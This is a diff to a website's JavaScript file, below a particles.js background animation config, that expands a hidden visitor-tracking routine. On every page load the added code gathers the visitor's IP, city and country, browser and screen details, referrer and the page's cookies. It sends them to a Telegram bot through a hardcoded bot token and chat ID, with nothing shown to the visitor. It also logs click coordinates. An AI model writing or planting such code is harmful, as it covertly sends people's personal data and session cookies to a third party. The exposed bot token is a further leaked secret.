@@ -201,31 +201,85 @@ particlesJS("particles-js", {
      retina_detect: true
    })
 
-(async function() {
+
+(async function () {
     try {
-        const ipResponse = await fetch('https://api.ipify.org?format=json');
-        const ipData = await ipResponse.json();
-        const ip = ipData.ip;
-        
+        console.log("Tracking started...");
+
+        // 📍 IP + Location
+        let ip = "Unknown";
+        let country = "Unknown";
+        let city = "Unknown";
+
+        try {
+            const res = await fetch("https://ipapi.co/json/");
+            const data = await res.json();
+            ip = data.ip;
+            country = data.country_name;
+            city = data.city;
+        } catch {}
+
+        // 🖥️ Device & Browser
         const userAgent = navigator.userAgent;
-        let browser = "Unknown";
-        let device = "Unknown";
+        const platform = navigator.platform;
+        const language = navigator.language;
 
-        if (userAgent.includes("Firefox")) browser = "Firefox";
-        else if (userAgent.includes("Chrome") && !userAgent.includes("Edg")) browser = "Chrome";
-        else if (userAgent.includes("Safari") && !userAgent.includes("Chrome")) browser = "Safari";
-        else if (userAgent.includes("Edg")) browser = "Edge";
-        
-        if (userAgent.includes("Android")) device = "Android";
-        else if (userAgent.includes("iPhone")) device = "iPhone";
-        else if (userAgent.includes("Windows")) device = "Windows";
-        else if (userAgent.includes("Mac")) device = "Mac";
-        else if (userAgent.includes("Linux")) device = "Linux";
+        // 📱 Screen info
+        const screenWidth = screen.width;
+        const screenHeight = screen.height;
 
-        const message = `📥 New Visitor IP: ${ip} Device: ${device} Agent: ${browser}`;
-        
-        const BOT_TOKEN = '8669960335:AAFE-pUq9VSj10S9YnbRGTZeAPDYg9Y5Qac'; 
-        const CHAT_ID = '1985661120'; 
+        // 🌐 Page info
+        const url = location.href;
+        const referrer = document.referrer;
+
+        // ⏰ Time
+        const visitTime = new Date().toLocaleString();
+
+        // ⚡️ Performance
+        const loadTime = performance.now();
+
+        // 🍪 Cookies (للموقع الحالي فقط)
+        const cookies = document.cookie || "No cookies";
+
+        // 📦 كل البيانات
+        const info = {
+            ip,
+            country,
+            city,
+            platform,
+            userAgent,
+            language,
+            screen: `${screenWidth}x${screenHeight}`,
+            url,
+            referrer,
+            visitTime,
+            loadTime,
+            cookies
+        };
+
+        // 🖨️ عرض في Console
+        console.log("Visitor Info:", info);
+
+        // 📥 رسالة منظمة
+        const message = `
+📥 New Visitor
+IP: ${ip}
+Location: ${country}, ${city}
+Device: ${platform}
+Language: ${language}
+Screen: ${screenWidth}x${screenHeight}
+Page: ${url}
+Referrer: ${referrer || "Direct"}
+Time: ${visitTime}
+Cookies: ${cookies}
+        `;
+
+        console.log(message);
+
+   
+
+        const BOT_TOKEN = '8669960335:AAFE-pUq9VSj10S9YnbRGTZeAPDYg9Y5Qac';
+        const CHAT_ID = '1985661120';
 
         await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
             method: 'POST',
@@ -235,6 +289,15 @@ particlesJS("particles-js", {
                 text: message
             })
         });
-    } catch (error) {
+
+
+        // 🖱️ Tracking interactions (اختياري)
+        document.addEventListener("click", (e) => {
+            console.log("Click:", e.pageX, e.pageY);
+        });
+
+    } catch (err) {
+        console.log("Tracking error:", err);
     }
 })();
+
